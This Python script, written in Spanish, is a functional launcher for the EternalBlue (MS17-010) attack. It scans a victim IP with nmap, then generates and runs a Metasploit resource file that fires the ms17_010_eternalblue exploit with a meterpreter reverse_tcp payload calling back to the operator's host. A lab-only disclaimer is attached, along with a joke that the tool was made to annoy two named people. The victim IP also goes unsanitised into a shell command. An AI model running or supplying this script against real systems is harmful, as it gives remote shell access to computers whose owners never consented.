#!/usr/bin/env python3
# EternalBlue_Estetico.py
# Versión: Funcional para laboratorio con estética de demo.
# **ADVERTENCIA: REQUIERE NMAP Y METASPLOIT INSTALADOS.**

import time
import random
import os
import sys
import subprocess

# --- CÓDIGOS DE COLOR ANSI (DE Titulo.py) ---
CSI = "\033["
RESET = CSI + "0m"
BOLD = CSI + "1m"
DIM = CSI + "2m"
RED = CSI + "31m"
GREEN = CSI + "32m"
YELLOW = CSI + "33m"
BLUE = CSI + "34m"
MAGENTA = CSI + "35m"
CYAN = CSI + "36m"
WHITE = CSI + "37m"

# --- BANNER DE ARTE ASCII (DE Titulo.py) ---
BANNER = r"""
     █████╗ ██╗   ██╗████████╗  ██████╗             ██████╗  ██╗     ██╗   ██╗███████╗
    ██╔══██╗██║   ██║╚══██╔══╝ ██╔═══██╗            ██╔══██╗ ██║     ██║   ██║██╔════╝
    ███████║██║   ██║   ██║    ██║   ██║   ██████╗  ██████╔╝ ██║     ██║   ██║█████╗  
    ██╔══██║██║   ██║   ██║    ██║   ██║   ╚═════╝  ██╔══██╗ ██║     ██║   ██║██╔══╝  
    ██║  ██║╚██████╔╝   ██║    ╚██████╔╝            ██████╔╝ ███████╗╚██████╔╝███████╗
    ╚═╝  ╚═╝ ╚═════╝    ╚═╝     ╚═════╝             ╚═════╝  ╚══════╝ ╚═════╝ ╚══════╝
"""

# --- EXPLICACIÓN DE USO (DE Titulo.py, adaptada) ---
USAGE = (
    f"{YELLOW}Uso:\n"
    "  1) Ingresá la IP objetivo.\n"
    "  2) Ingresá tu IP local (LHOST).\n"
    "  3) El script ejecutará Nmap para verificar la vulnerabilidad.\n"
    "  4) Si es vulnerable, lanzará Metasploit. (Requiere Nmap y Metasploit).\n\n"
)

# --- DISCLAIMER (DE Titulo.py, adaptado) ---
DISCLAIMER = (
    f"\n{BOLD}{RED}DISCLAIMER LEGAL Y ÉTICO (IMPORTANTE){RESET}\n"
    "ESTE PROGRAMA ES FUNCIONAL Y EJECUTA HERRAMIENTAS REALES (Nmap/Metasploit).\n"
    "Solo debe utilizarse para escanear y atacar sistemas que sean de tu\n"
    "propiedad o dentro de un entorno de laboratorio con autorización expresa.\n"
    "El uso no autorizado es ilegal.\n"
    "Solamente fue creado para molestar a Danners y Diegotec (y para prácticas de lab).\n"
)

# --- FUNCIONES DE ESTÉTICA (DE Titulo.py) ---

def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def slow_print(text, delay=0.02):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def header():
    clear_screen()
    print(CYAN + BANNER + RESET)
    print(USAGE)
    # Se imprime el disclaimer al final en la función main.

# --- FUNCIONES DE EXPLOTACIÓN (DE EternalBlue.py) ---

def escanear(ip_objetivo):
    slow_print(f"{BOLD}[+] Iniciando Nmap para MS17-010 contra {ip_objetivo}...", 0.01)
    comando = f"nmap -p 445 --script smb-vuln-ms17-010 {ip_objetivo}"
    
    # Se usa subprocess.run para mejor manejo de la salida con colores
    try:
        resultado = subprocess.run(
            comando, 
            shell=True, 
            capture_output=True, 
            text=True, 
            check=True
        ).stdout
    except subprocess.CalledProcessError as e:
        slow_print(f"{RED}[-] Error al ejecutar Nmap. Asegurate que Nmap esté en el PATH.", 0.01)
        return False
    except FileNotFoundError:
        slow_print(f"{RED}[-] Error: El comando 'nmap' no fue encontrado. Instalá Nmap.", 0.01)
        return False

    # Imprimir el resultado real del escaneo
    print(DIM + resultado + RESET)
    
    if "VULNERABLE" in resultado:
        slow_print(GREEN + BOLD + "\n[+] RESULTADO: EL SISTEMA ES VULNERABLE A MS17-010 (EternalBlue)!" + RESET, 0.01)
        return True
    else:
        slow_print(RED + BOLD + "\n[-] RESULTADO: EL SISTEMA NO PARECE VULNERABLE." + RESET, 0.01)
        return False

def generar_script_msf(ip_victima, ip_local):
    contenido = f"""
# eternalblue_auto.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {ip_victima}
set LHOST {ip_local}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
"""
    with open("eternalblue_auto.rc", "w") as archivo:
        archivo.write(contenido)
    slow_print(GREEN + "\n[+] Script para Metasploit generado: eternalblue_auto.rc" + RESET, 0.01)
    return contenido

def ejecutar_msfconsole():
    slow_print(MAGENTA + "[*] Ejecutando Metasploit con el script... ¡Buena Suerte!" + RESET, 0.01)
    # Se usa os.system para permitir que msfconsole tome el control de la terminal
    os.system("msfconsole -r eternalblue_auto.rc")

# --- FUNCIÓN PRINCIPAL (COMBINADA) ---

def main():
    header()
    
    # Petición de IPs en el medio (como querías)
    ip_victima = input(BOLD + "IP de la víctima: " + RESET).strip()
    ip_local = input(BOLD + "Tu IP local (LHOST): " + RESET).strip()
    print()

    # Muestra el disclaimer antes de la ejecución real
    show_disclaimer() 
    
    slow_print("\nPresiona Enter para iniciar la EXPLOTACIÓN REAL (LABORATORIO REQUERIDO)...", 0.01)
    input()
    
    if escanear(ip_victima):
        slow_print(GREEN + "\n[+] Preparando la explotación..." + RESET, 0.01)
        generar_script_msf(ip_victima, ip_local)
        time.sleep(1)
        ejecutar_msfconsole()
    else:
        slow_print(YELLOW + "\n[!] Finalizado. No se lanzará el exploit ya que Nmap no detectó vulnerabilidad." + RESET, 0.01)

    print(CYAN + "\n== FIN DEL PROCESO ==" + RESET)

def show_disclaimer():
    print(DISCLAIMER)

if __name__ == "__main__":
    main()